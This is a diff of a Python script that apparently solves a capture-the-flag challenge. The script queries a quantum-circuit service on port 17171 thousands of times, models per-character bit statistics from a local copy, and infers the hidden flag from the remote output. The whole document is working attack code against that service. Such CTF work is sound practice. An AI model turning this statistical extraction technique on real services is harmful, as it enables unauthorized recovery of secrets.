@@ -8,48 +8,14 @@ import string
 import socket
 import subprocess
 
+from threading import Thread
+
 
 IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
 PORT = 17171
 
 
-def interact_remote(payload):
-    size = 1024
-    output = b''
-
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-        sock.settimeout(3)
-        sock.connect((IP, PORT))
-
-        sock.sendall(payload.encode())
-        
-        while True:
-            data = sock.recv(size)
-
-            if len(data) <= 0:
-                break
-
-            output += data
-
-    return output
-
-
-def interact_local(payload):
-    args = ['dotnet', './deploy/service/ZN.Runner.dll']
-
-    with subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as process:
-        stdout, _ = process.communicate(payload.encode())
-        return stdout
-
-
-def split_output(output):
-    lines = output.replace(b'>>> ', b'').decode().split(os.linesep)[:-1]
-
-    for line in lines:
-        yield bytes.fromhex(line)
-
-
-def generate_payload(repeat):
+def generate_payload():
     operation = 'Ry ' + str(-math.pi / 2)
     operations = []
 
@@ -60,18 +26,63 @@ def generate_payload(repeat):
             'SWAP', str(i),
         ])
 
-    text = operation + ' ' + ' '.join(operations)
-    return (text + os.linesep) * repeat + os.linesep
+    return operation + ' ' + ' '.join(operations)
 
 
-def calculate_counters(repeat, interact):
+def get_remote_io():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5)
+    
+    sock.connect((IP, PORT))
+
+    file = sock.makefile('rwb')
+
+    return file, file
+
+
+def get_local_io():
+    args = ['dotnet', './deploy/service/ZN.Runner.dll']
+    process = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    return process.stdin, process.stdout
+
+
+def send_payload(io, payload, repeat):
+    for _ in range(repeat):
+        io.write((payload + os.linesep).encode())
+        io.flush()
+
+    io.write(os.linesep.encode())
+    io.flush()
+
+
+def read_output(io, repeat):
+    for i in range(repeat):
+        print('\rReading line... [ %d / %d ]' % (i + 1, repeat), end='')
+
+        line = io.readline().strip().replace(b'>>> ', b'')
+
+        if len(line) == 0:
+            break
+
+        yield line
+
+    print()
+
+
+def calculate_counters(io, repeat):
     bitsize = 8
-    payload = generate_payload(repeat)
+    
+    payload = generate_payload()
+    fin, fout = io
+    thread = Thread(target=send_payload, args=(fin, payload, repeat), daemon=True)
+    thread.start()
+    
     counters = []
 
-    output = interact(payload)
+    for i, line in enumerate(read_output(fout, repeat)):
+        data = bytes.fromhex(line.decode())
 
-    for data in split_output(output):
         for i, byte in enumerate(data):
             bits = bin(byte)[2:].zfill(bitsize)
             
@@ -84,17 +95,17 @@ def calculate_counters(repeat, interact):
     return counters
 
 
-def write_flag(text):
+def write_local_flag(text):
     filename = 'flag.txt'
 
     with open(filename, 'w') as file:
         file.write(text)
 
 
-def get_model(alphabet, repeat):
-    write_flag(alphabet)
+def construct_model(alphabet, repeat):
+    write_local_flag(alphabet)
 
-    counters = calculate_counters(repeat, interact_local)
+    counters = calculate_counters(get_local_io(), repeat)
 
     return dict((symbol, counter) for symbol, counter in zip(alphabet, counters)) 
 
@@ -113,7 +124,7 @@ def load_model():
         return json.load(file)
         
 
-def counters_equal(counter1, counter2, eps=100):
+def counters_equal(counter1, counter2, eps):
     for x, y in zip(counter1, counter2):
         if abs(x - y) > eps:
             return False
@@ -121,44 +132,47 @@ def counters_equal(counter1, counter2, eps=100):
     return True
 
 
-def get_possible_flags(model, counters):
-    possible_symbols = []
+def try_get_flag(model, counters, eps):
+    flag = []
 
     for counter in counters:
-        part = []
+        symbols = []
 
         for symbol in model:
-            if counters_equal(model[symbol], counter):
-                part.append(symbol)
+            if counters_equal(model[symbol], counter, eps):
+                symbols.append(symbol)
 
-        possible_symbols.append(part)
+        if len(symbols) != 1:
+            return None
 
-    max_index = max(map(len, possible_symbols))
+        flag.append(symbols[0])
 
-    for index in range(max_index):
-        flag = ''
-
-        for part in possible_symbols:
-            if len(part) > index:
-                flag += part[index]
-            else:
-                flag += part[0]
-
-        yield flag
+    return ''.join(flag)
 
 
 def main():
-    repeat = 1000
+    repeat = 5000
     alphabet = string.ascii_letters + string.digits + '{}_'
 
-    # model = get_model(alphabet, repeat)
+    # model = construct_model(alphabet, repeat)
     # save_model(model)
+    # print('Model saved')
+    # return
     model = load_model()
+    print('Model loaded')
 
-    counters = calculate_counters(repeat, interact_remote)
-    
-    for flag in get_possible_flags(model, counters):
-        print(flag)
+    counters = calculate_counters(get_remote_io(), repeat)
+    print('Counters loaded')
+
+    possible_flags = set()
+
+    for eps in range(1, repeat):
+        possible_flag = try_get_flag(model, counters, eps)
+
+        if possible_flag is not None:
+            possible_flags.add(possible_flag)
+
+    print(possible_flags)
 
 
 if __name__ == '__main__':
